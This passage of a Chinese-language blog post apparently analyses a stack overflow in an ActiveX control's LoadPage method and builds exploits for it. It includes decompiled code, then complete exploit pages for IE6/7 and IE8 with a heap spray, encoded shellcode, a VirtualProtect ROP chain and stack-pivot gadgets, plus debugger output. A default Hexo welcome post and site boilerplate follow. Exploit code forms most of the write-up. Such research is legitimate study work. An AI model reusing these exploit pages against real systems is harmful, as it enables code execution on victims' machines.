<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_10012D10</span><span class="params">(<span class="keyword">void</span> *<span class="keyword">this</span>, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  v3 = (<span class="keyword">int</span>)<span class="keyword">this</span>;</div><div class="line">  sub_10001590(<span class="number">333</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">  v4 = <span class="built_in">strlen</span>(a2) - <span class="number">1</span>;</div><div class="line">  <span class="keyword">do</span></div><div class="line">  &#123;</div><div class="line">    v5 = a2[v4];</div><div class="line">    <span class="keyword">if</span> ( v5 != <span class="string">'\\'</span> &amp;&amp; v5 != <span class="string">'/'</span> &amp;&amp; v5 != <span class="string">' '</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v6 = v4--;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</div><div class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  qmemcpy(&amp;v11, a2, v4 + <span class="number">1</span>);</div><div class="line">  v12[v4] = <span class="number">0</span>;</div><div class="line">  v10 = &amp;v11;</div><div class="line">  sub_10013DC0(&amp;v10, &amp;v11);</div><div class="line">  v8 = *(_DWORD *)(v3 + <span class="number">10104</span>);</div><div class="line">  *(_DWORD *)(v3 + <span class="number">10116</span>) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( v8 )</div><div class="line">  &#123;</div><div class="line">  ......</div><div class="line">  &#125;</div><div class="line">  ......</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序的在函数<code>sub_10013DC0</code>里发生崩溃，该函数将字符串a3拷贝给String变量造成栈溢出，函数结束时返回地址被无效指针覆盖，返回地址偏移为<code>0x100</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> __<span class="function">thiscall <span class="title">sub_10013DC0</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="keyword">void</span> **a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  v3 = <span class="keyword">this</span>;</div><div class="line">  v4 = <span class="built_in">strlen</span>(a3) + <span class="number">1</span>;</div><div class="line">  v5 = v4;</div><div class="line">  v4 &gt;&gt;= <span class="number">2</span>;</div><div class="line">  qmemcpy(String, a3, <span class="number">4</span> * v4);</div><div class="line">  v7 = &amp;a3[<span class="number">4</span> * v4];</div><div class="line">  v6 = &amp;String[<span class="number">4</span> * v4];</div><div class="line">  LOBYTE(v4) = v5;</div><div class="line">  v8 = v3[<span class="number">4069</span>];</div><div class="line">  qmemcpy(v6, v7, v4 &amp; <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> ( v8 != <span class="number">1</span></div><div class="line">    || !_strnicmp(String, aHttp, <span class="number">7u</span>)</div><div class="line">    || (v9 = &amp;String[lstrlenA(String)], _strnicmp(v9 - <span class="number">3</span>, aPdg, <span class="number">3u</span>))</div><div class="line">    || *(v9 - <span class="number">11</span>) != <span class="number">92</span></div><div class="line">    || (v10 = (<span class="keyword">int</span>)(v9 - <span class="number">10</span>), *(v9 - <span class="number">10</span>) != <span class="number">48</span>) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">  ......</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>另外需要注意的是，我们输入的参数会先转化为unicode，然后再在函数<code>sub_1001CD30</code>中调用<code>WideCharToMultiByte</code>转化为ASCII，如果字符有超过0x7f的话，两次转化之后会变成0x3f(即”?”)，所以在写exp的时候需要注意。</p>
<h2 id="0x02-exp编写"><a href="#0x02-exp编写" class="headerlink" title="0x02 exp编写"></a>0x02 exp编写</h2><h3 id="IE6-IE7"><a href="#IE6-IE7" class="headerlink" title="IE6/IE7"></a>IE6/IE7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var nops = unescape("%u9090%u9090");</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">0x100000</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);</span></div><div class="line"><span class="undefined">nops = nops + shellcode;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var memory = new Array();</span></div><div class="line"><span class="undefined">for(var i=0;i&lt;500;i++)&#123;</span></div><div class="line"><span class="undefined">	memory[i] += nops;</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Test");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">256</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这里<code>memory[i] += nops</code>如果写成<code>memory[i] = nops</code>，则不会分配大的堆块，导致覆盖不到0x0c0c0c0c的地址，应该与javascript的深拷贝和浅拷贝有关，浅拷贝的话两个变量指向同一个对象，深拷贝的话才拷贝内容。</p>
<p>如果改成<code>memory[i] = nops + unescape(&quot;%u9090&quot;)</code>或者<code>memory[i] = nops.substring(0,nops.length)</code>这样可以。</p>
<p>另外，参考文章里提到下面这句，32指堆块首部，4字节指javascript的BSTR字符串头部，2字节为字符串结束符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);</div></pre></td></tr></table></figure>
<p><img src="/img/chaoxing reader 4.0/0x02-1.png" alt="Heap spray"></p>
<p>在调试过程中，并没有发现堆块有32字节的首部，只看到8字节的首部，所以对此不太理解。</p>
<h3 id="IE8"><a href="#IE8" class="headerlink" title="IE8"></a>IE8</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var nops = unescape("%9090%u9090");</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">rop_gadgets = unescape(</span></div><div class="line"><span class="undefined">	"%ue146%u77be" + // 0x77bee146 : ,# POP EBP # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%ue146%u77be" + // 0x77bee146 : ,# skip 4 bytes [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u771a%u77c1" + // 0x77c1771a : ,# POP EBX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u0201%u0000" + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></div><div class="line"><span class="undefined">	"%ue185%u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u0040%u0000" + // 0x00000040 : ,# 0x00000040-&gt; edx</span></div><div class="line"><span class="undefined">	"%uc5a3%u77bf" + // 0x77bfc5a3 : ,# POP ECX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u001f%u77c3" + // 0x77c3001f : ,# &amp;Writable location [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u610d%u77c1" + // 0x77c1610d : ,# POP EDI # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u6101%u77c1" + // 0x77c16101 : ,# RETN (ROP NOP) [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u4d9a%u77c0" + // 0x77c04d9a : ,# POP ESI # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%uaacc%u77bf" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%uded4%u77c1" + // 0x77c1ded4 : ,# POP EAX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u1131%u77be" + // 0x77be1120 : ,# ptr to &amp;VirtualProtect() [IAT msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u67f0%u77c2" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u1025%u77c2" + // 0x77c21025 : ,# ptr to 'push esp # ret ' [msvcrt.dll]</span></div><div class="line"><span class="undefined">	""</span></div><div class="line"><span class="undefined">); //  : </span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">0x1000</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">var before = nops.substring(0,0x5f6);</span></div><div class="line"><span class="undefined">var end = before + rop_gadgets + shellcode + nops.substring(0,0x800-before.length-rop_gadgets.length-shellcode.length);</span></div><div class="line"><span class="xml">while(end.length<span class="tag">&lt;<span class="name">0x40000)</span> <span class="attr">end</span> += <span class="string">end;</span></span></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var memory = new Array();</span></div><div class="line"><span class="undefined">for(var i=0;i&lt;400;i++)&#123;</span></div><div class="line"><span class="undefined">	memory[i] = end.substring(2,end.length-0x21);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Test");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">256</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">arg1 += "\x1b\x71\x38\x63";	//pop eax;ret</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 += "\x2d\x30\x3b\x63";	//xchg eax,esp;ret</span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>参考文章那篇对WinXpSp3+IE8写的很详细了，我这里就稍微写一下。</p>
<p>1、通过mona插件获取<code>VirtualProtect</code>的ROP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona rop -m msvcrt.dll</div></pre></td></tr></table></figure>
<p>在<code>Immunity debugger</code>目录下的<code>rop_chains.txt</code>文件就可以查看，不过这里获取的ROP链有些问题：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">rop_gadgets = unescape(</div><div class="line">  "%ue146%u77be" + // 0x77bee146 : ,# POP EBP # RETN [msvcrt.dll] </div><div class="line">  "%ue146%u77be" + // 0x77bee146 : ,# skip 4 bytes [msvcrt.dll]</div><div class="line">  "%u771a%u77c1" + // 0x77c1771a : ,# POP EBX # RETN [msvcrt.dll] </div><div class="line">  "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-&gt; ebx</div><div class="line">  "%ue185%u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll] </div><div class="line">  "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-&gt; edx</div><div class="line">  "%uc5a3%u77bf" + // 0x77bfc5a3 : ,# POP ECX # RETN [msvcrt.dll] </div><div class="line">  "%u001f%u77c3" + // 0x77c3001f : ,# &amp;Writable location [msvcrt.dll]</div><div class="line">  "%u610d%u77c1" + // 0x77c1610d : ,# POP EDI # RETN [msvcrt.dll] </div><div class="line">  "%u6101%u77c1" + // 0x77c16101 : ,# RETN (ROP NOP) [msvcrt.dll]</div><div class="line">  "%u4d9a%u77c0" + // 0x77c04d9a : ,# POP ESI # RETN [msvcrt.dll] </div><div class="line">  "%uaacc%u77bf" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]</div><div class="line">  "%uded4%u77c1" + // 0x77c1ded4 : ,# POP EAX # RETN [msvcrt.dll] </div><div class="line">  "%u1120%u77be" + // 0x77be1120 : ,# ptr to &amp;VirtualProtect() [IAT msvcrt.dll]</div><div class="line">  "%u67f0%u77c2" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll] </div><div class="line">  "%u1025%u77c2" + // 0x77c21025 : ,# ptr to 'push esp # ret ' [msvcrt.dll]</div><div class="line">  ""); //  :</div></pre></td></tr></table></figure>
<p>通过倒数第四个、第三个gadget中，已经成功使eax的值指向<code>VirtualProtect</code>地址，但下一个gadget却又将寄存器AL的值加上了0xEF，所以需要对倒数第三个gadget进行修改，改成：<code>0x77be1120-0xEF+256=0x77be1131</code>。</p>
<p>2、分配堆之后，在windbg中查看堆分配的统计数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:019&gt; !heap -stat -h 150000</div><div class="line"> heap @ 00150000</div><div class="line">group-by: TOTSIZE max-display: 20</div><div class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</div><div class="line">    7ffc0 190 - c7f9c00  (98.24)</div><div class="line">    3fff8 3 - bffe8  (0.37)</div><div class="line">    1fff8 6 - bffd0  (0.37)</div><div class="line">    80010 1 - 80010  (0.25)</div><div class="line">    fff8 6 - 5ffd0  (0.18)</div><div class="line">	......</div></pre></td></tr></table></figure>
<p>可以看到分配了190个大小为7ffc0的堆，查看这些堆信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:019&gt; !heap -flt s 7ffc0</div><div class="line">    _HEAP @ 150000</div><div class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</div><div class="line">        0be60018 fff8 0000  [0b]   0be60020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        0bef0018 fff8 fff8  [0b]   0bef0020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        0bf80018 fff8 fff8  [0b]   0bf80020    7ffc0 - (busy VirtualAlloc)</div><div class="line">		......</div><div class="line">	   	......</div><div class="line">        1a020018 fff8 fff8  [0b]   1a020020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        1a0b0018 fff8 fff8  [0b]   1a0b0020    7ffc0 - (busy VirtualAlloc)</div></pre></td></tr></table></figure>
<p>这些堆的起始地址后四位都是0018，数据区都是从0020开始，因此如果0x0c0c0c0c为ROP的起始地址，需要填充的NOP数为<code>(0x0C0C0C0C - 0xXXXX0020)/2%0x1000 = 0x5f6</code>。</p>
<p>针对exp中<code>end.substring(2,end.length-0x21)</code>有点不太理解，据说是前辈们的经验所得。从下标2开始，应该和BSTR字符串的内存空间占用情况有关系，BSTR字符串有四字节的header，所以0xXXXX0020开始的四字节为BSTR字符串的头部。0x21中的0x1应该是指BSTR的两字节结束符，之所以为什么还要减去0x20就不是很懂了。经过测试发现，减不减去0x21都不影响exp的正常执行。</p>
<p>3、查找<code>pop eax;ret</code>跳板：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona find -s &quot;\x58\xC3&quot;</div></pre></td></tr></table></figure>
<p>查找<code>xchg eax,esp;ret</code>跳板：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona find -s &quot;\x94\xC3&quot;</div></pre></td></tr></table></figure>
<p>应注意选取的跳板地址里每一字节的值不能超过0x7f，这里选取的两个跳板地址为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x6338711b : &quot;\x58\xC3&quot;	pop eax;ret</div><div class="line">0x633b302d : &quot;\x94\xC3&quot;	xchg eax,esp;ret</div></pre></td></tr></table></figure>
<p>4、函数<code>sub_10013DC0</code>的return指令为<code>retn 8</code>，会把栈抬高8字节，所以exp中<code>pop eax;ret</code>和<code>xchg eax,esp;ret</code>两个指令地址中间除了4字节的<code>\x0c\x0c\x0c\x0c</code>，又多填充了8字节。</p>
<p>5、参考文章中分配了200个大堆块，我测试的时候200个堆块不足以达到0x0c0c0c0c地址处，因此改成了400个。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/18/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/18/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-18T11:22:43+08:00">
                2017-08-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="John Doe" />
          <p class="site-author-name" itemprop="name">John Doe</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">3</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">1</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">
    由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
  </div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">
    主题 &mdash;
    <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
      NexT.Pisces
    </a>
  </div>


        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

